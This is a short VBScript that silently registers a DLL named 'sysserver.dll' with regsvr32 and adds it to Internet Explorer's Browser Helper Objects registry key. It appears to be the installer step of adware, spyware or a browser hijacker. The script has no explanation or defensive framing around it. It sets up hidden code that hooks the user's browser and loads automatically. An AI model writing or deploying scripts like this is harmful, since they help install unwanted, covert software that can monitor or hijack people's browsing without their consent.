Dim objShell
Set objShell = CreateObject("WScript.Shell") 
strCmd = "%comspec% /c regsvr32 /s ""sysserver.dll"""
objShell.Run strCmd, 2, True
objShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{68FA9068-1CA5-42D9-96EC-518A4F7E3642}\NoExplorer", 1, "REG_BINARY"